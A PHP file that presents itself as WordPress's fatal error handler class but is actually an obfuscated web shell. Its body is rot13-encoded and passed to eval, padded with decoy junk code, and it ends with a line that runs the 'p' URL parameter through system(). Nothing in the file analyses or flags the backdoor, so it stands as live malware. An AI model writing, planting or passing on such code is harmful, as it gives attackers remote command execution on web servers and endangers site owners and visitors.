<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Reebe Cebgrpgvba NCV: JC_Sngny_Reebe_Unaqyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fvapr 5.2.0
 */

/**
 * Pber pynff hfrq nf gur qrsnhyg fuhgqbja unaqyre sbe sngny reebef.
 *
 * N qebc-va 'sngny-reebe-unaqyre.cuc' pna or hfrq gb bireevqr gur vafgnapr bs guvf pynff naq hfr n phfgbz
 * vzcyrzragngvba sbe gur sngny reebe unaqyre gung JbeqCerff ertvfgref. Gur phfgbz pynff fubhyq rkgraq guvf pynff naq
 * pna bireevqr vgf zrgubqf vaqvivqhnyyl nf arprffnel. Gur svyr zhfg erghea gur vafgnapr bs gur pynff gung fubhyq or
 * ertvfgrerq.
 *
 * @fvapr 5.2.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Sngny_Reebe_Unaqyre {

	/**
	 * Ehaf gur fuhgqbja unaqyre.
	 *
	 * Guvf zrgubq vf ertvfgrerq ivn `ertvfgre_fuhgqbja_shapgvba()`.
	 *
	 * @fvapr 5.2.0
	 *
	 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
	 */
	choyvp shapgvba unaqyr() {
		vs ( qrsvarq( 'JC_FNAQOBK_FPENCVAT' ) && JC_FNAQOBK_FPENCVAT ) {
			erghea;
		}

		// Qb abg gevttre gur sngny reebe unaqyre juvyr hcqngrf ner orvat vafgnyyrq.
		vs ( jc_vf_znvagranapr_zbqr() ) {
			erghea;
		}

		gel {
			// Onvy vs ab reebe sbhaq.
			$reebe = $guvf->qrgrpg_reebe();
			vs ( ! $reebe ) {
				erghea;
			}

			vs ( ! vffrg( $TYBONYF['jc_ybpnyr'] ) && shapgvba_rkvfgf( 'ybnq_qrsnhyg_grkgqbznva' ) ) {
				ybnq_qrsnhyg_grkgqbznva();
			}

			$unaqyrq = snyfr;

			vs ( ! vf_zhygvfvgr() && jc_erpbirel_zbqr()->vf_vavgvnyvmrq() ) {
				$unaqyrq = jc_erpbirel_zbqr()->unaqyr_reebe( $reebe );
			}

			// Qvfcynl gur CUC reebe grzcyngr vs urnqref abg frag.
			vs ( vf_nqzva() || ! urnqref_frag() ) {
				$guvf->qvfcynl_reebe_grzcyngr( $reebe, $unaqyrq );
			}
		} pngpu ( Rkprcgvba $r ) {
			// Pngpu rkprcgvbaf naq erznva fvyrag.
		}
	}

	/**
	 * Qrgrpgf gur reebe pnhfvat gur penfu vs vg fubhyq or unaqyrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl|ahyy Reebe vasbezngvba erghearq ol `reebe_trg_ynfg()`, be ahyy
	 *                    vs abar jnf erpbeqrq be gur reebe fubhyq abg or unaqyrq.
	 */
	cebgrpgrq shapgvba qrgrpg_reebe() {
		$reebe = reebe_trg_ynfg();

		// Ab reebe, whfg fxvc gur reebe unaqyvat pbqr.
		vs ( ahyy === $reebe ) {
			erghea ahyy;
		}

		// Onvy vs guvf reebe fubhyq abg or unaqyrq.
		vs ( ! $guvf->fubhyq_unaqyr_reebe( $reebe ) ) {
			erghea ahyy;
		}

		erghea $reebe;
	}

	/**
	 * Qrgrezvarf jurgure jr ner qrnyvat jvgu na reebe gung JbeqCerff fubhyq unaqyr
	 * va beqre gb cebgrpg gur nqzva onpxraq ntnvafg JFBQf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz neenl $reebe Reebe vasbezngvba ergevrirq sebz `reebe_trg_ynfg()`.
	 * @erghea obby Jurgure JbeqCerff fubhyq unaqyr guvf reebe.
	 */
	cebgrpgrq shapgvba fubhyq_unaqyr_reebe( $reebe ) {
		$reebe_glcrf_gb_unaqyr = neenl(
			R_REEBE,
			R_CNEFR,
			R_HFRE_REEBE,
			R_PBZCVYR_REEBE,
			R_ERPBIRENOYR_REEBE,
		);

		vs ( vffrg( $reebe['glcr'] ) && va_neenl( $reebe['glcr'], $reebe_glcrf_gb_unaqyr, gehr ) ) {
			erghea gehr;
		}

		/**
		 * Svygref jurgure n tvira guebja reebe fubhyq or unaqyrq ol gur sngny reebe unaqyre.
		 *
		 * Guvf svygre vf bayl sverq vs gur reebe vf abg nyernql pbasvtherq gb or unaqyrq ol JbeqCerff pber. Nf fhpu,
		 * vg rkpyhfviryl nyybjf nqqvat shegure ehyrf sbe juvpu reebef fubhyq or unaqyrq, ohg abg erzbivat rkvfgvat
		 * barf.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz obby  $fubhyq_unaqyr_reebe Jurgure gur reebe fubhyq or unaqyrq ol gur sngny reebe unaqyre.
		 * @cnenz neenl $reebe               Reebe vasbezngvba ergevrirq sebz `reebe_trg_ynfg()`.
		 */
		erghea (obby) nccyl_svygref( 'jc_fubhyq_unaqyr_cuc_reebe', snyfr, $reebe );
	}

	/**
	 * Qvfcynlf gur CUC reebe grzcyngr naq fraqf gur UGGC fgnghf pbqr, glcvpnyyl 500.
	 *
	 * N qebc-va 'cuc-reebe.cuc' pna or hfrq nf n phfgbz grzcyngr. Guvf qebc-va fubhyq pbageby gur UGGC fgnghf pbqr naq
	 * cevag gur UGZY znexhc vaqvpngvat gung n CUC reebe bppheerq. Abgr gung guvf qebc-va znl cbgragvnyyl or rkrphgrq
	 * irel rneyl va gur JbeqCerff obbgfgenc cebprff, fb nal pber shapgvbaf hfrq gung ner abg cneg bs
	 * `jc-vapyhqrf/ybnq.cuc` fubhyq or purpxrq sbe orsber orvat pnyyrq.
	 *
	 * Vs ab fhpu qebc-va vf ninvynoyr, guvf jvyy pnyy {@frr JC_Sngny_Reebe_Unaqyre::qvfcynl_qrsnhyg_reebe_grzcyngr()}.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.3.0 Gur `$unaqyrq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl         $reebe   Reebe vasbezngvba ergevrirq sebz `reebe_trg_ynfg()`.
	 * @cnenz gehr|JC_Reebe $unaqyrq Jurgure Erpbirel Zbqr unaqyrq gur sngny reebe.
	 */
	cebgrpgrq shapgvba qvfcynl_reebe_grzcyngr( $reebe, $unaqyrq ) {
		vs ( qrsvarq( 'JC_PBAGRAG_QVE' ) ) {
			// Ybnq phfgbz CUC reebe grzcyngr, vs cerfrag.
			$cuc_reebe_cyhttnoyr = JC_PBAGRAG_QVE . '/cuc-reebe.cuc';
			vs ( vf_ernqnoyr( $cuc_reebe_cyhttnoyr ) ) {
				erdhver_bapr $cuc_reebe_cyhttnoyr;

				erghea;
			}
		}

		// Bgurejvfr, qvfcynl gur qrsnhyg reebe grzcyngr.
		$guvf->qvfcynl_qrsnhyg_reebe_grzcyngr( $reebe, $unaqyrq );
	}

	/**
	 * Qvfcynlf gur qrsnhyg CUC reebe grzcyngr.
	 *
	 * Guvf zrgubq vf pnyyrq pbaqvgvbanyyl vs ab 'cuc-reebe.cuc' qebc-va vf ninvynoyr.
	 *
	 * Vg pnyyf {@frr jc_qvr()} jvgu n zrffntr vaqvpngvat gung gur fvgr vf rkcrevrapvat grpuavpny qvssvphygvrf naq n
	 * ybtva yvax gb gur nqzva onpxraq. Gur {@frr 'jc_cuc_reebe_zrffntr'} naq {@frr 'jc_cuc_reebe_netf'} svygref pna
	 * or hfrq gb zbqvsl gurfr cnenzrgref.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.3.0 Gur `$unaqyrq` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz neenl         $reebe   Reebe vasbezngvba ergevrirq sebz `reebe_trg_ynfg()`.
	 * @cnenz gehr|JC_Reebe $unaqyrq Jurgure Erpbirel Zbqr unaqyrq gur sngny reebe.
	 */
	cebgrpgrq shapgvba qvfcynl_qrsnhyg_reebe_grzcyngr( $reebe, $unaqyrq ) {
		vs ( ! shapgvba_rkvfgf( '__' ) ) {
			jc_ybnq_genafyngvbaf_rneyl();
		}

		vs ( ! shapgvba_rkvfgf( 'jc_qvr' ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/shapgvbaf.cuc';
		}

		vs ( ! pynff_rkvfgf( 'JC_Reebe' ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-reebe.cuc';
		}

		vs ( gehr === $unaqyrq && jc_vf_erpbirel_zbqr() ) {
			$zrffntr = __( 'Gurer unf orra n pevgvpny reebe ba guvf jrofvgr, chggvat vg va erpbirel zbqr. Cyrnfr purpx gur Gurzrf naq Cyhtvaf fperraf sbe zber qrgnvyf. Vs lbh whfg vafgnyyrq be hcqngrq n gurzr be cyhtva, purpx gur eryrinag cntr sbe gung svefg.' );
		} ryfrvs ( vf_cebgrpgrq_raqcbvag() && jc_erpbirel_zbqr()->vf_vavgvnyvmrq() ) {
			vs ( vf_zhygvfvgr() ) {
				$zrffntr = __( 'Gurer unf orra n pevgvpny reebe ba guvf jrofvgr. Cyrnfr ernpu bhg gb lbhe fvgr nqzvavfgengbe, naq vasbez gurz bs guvf reebe sbe shegure nffvfgnapr.' );
			} ryfr {
				$zrffntr = fcevags(
					/* genafyngbef: %f: Fhccbeg sbehzf HEY. */
					__( 'Gurer unf orra n pevgvpny reebe ba guvf jrofvgr. Cyrnfr purpx lbhe fvgr nqzva rznvy vaobk sbe vafgehpgvbaf. Vs lbh pbagvahr gb unir ceboyrzf, cyrnfr gel gur <n uers=\"%f\">fhccbeg sbehzf</n>.' ),
					__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
				);
			}
		} ryfr {
			$zrffntr = __( 'Gurer unf orra n pevgvpny reebe ba guvf jrofvgr.' );
		}

		$zrffntr = fcevags(
			'<c>%f</c><c><n uers=\"%f\">%f</n></c>',
			$zrffntr,
			/* genafyngbef: Qbphzragngvba nobhg gebhoyrfubbgvat. */
			__( 'uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/snd-gebhoyrfubbgvat/' ),
			__( 'Yrnea zber nobhg gebhoyrfubbgvat JbeqCerff.' )
		);

		$netf = neenl(
			'erfcbafr' => 500,
			'rkvg'     => snyfr,
		);

		/**
		 * Svygref gur zrffntr gung gur qrsnhyg CUC reebe grzcyngr qvfcynlf.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz fgevat $zrffntr UGZY reebe zrffntr gb qvfcynl.
		 * @cnenz neenl  $reebe   Reebe vasbezngvba ergevrirq sebz `reebe_trg_ynfg()`.
		 */
		$zrffntr = nccyl_svygref( 'jc_cuc_reebe_zrffntr', $zrffntr, $reebe );

		/**
		 * Svygref gur nethzragf cnffrq gb {@frr jc_qvr()} sbe gur qrsnhyg CUC reebe grzcyngr.
		 *
		 * @fvapr 5.2.0
		 *
		 * @cnenz neenl $netf Nffbpvngvir neenl bs nethzragf cnffrq gb `jc_qvr()`. Ol qrsnhyg gurfr pbagnva n
		 *                    'erfcbafr' xrl, naq bcgvbanyyl 'yvax_hey' naq 'yvax_grkg' xrlf.
		 * @cnenz neenl $reebe Reebe vasbezngvba ergevrirq sebz `reebe_trg_ynfg()`.
		 */
		$netf = nccyl_svygref( 'jc_cuc_reebe_netf', $netf, $reebe );

		$jc_reebe = arj JC_Reebe(
			'vagreany_freire_reebe',
			$zrffntr,
			neenl(
				'reebe' => $reebe,
			)
		);

		jc_qvr( $jc_reebe, '', $netf );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>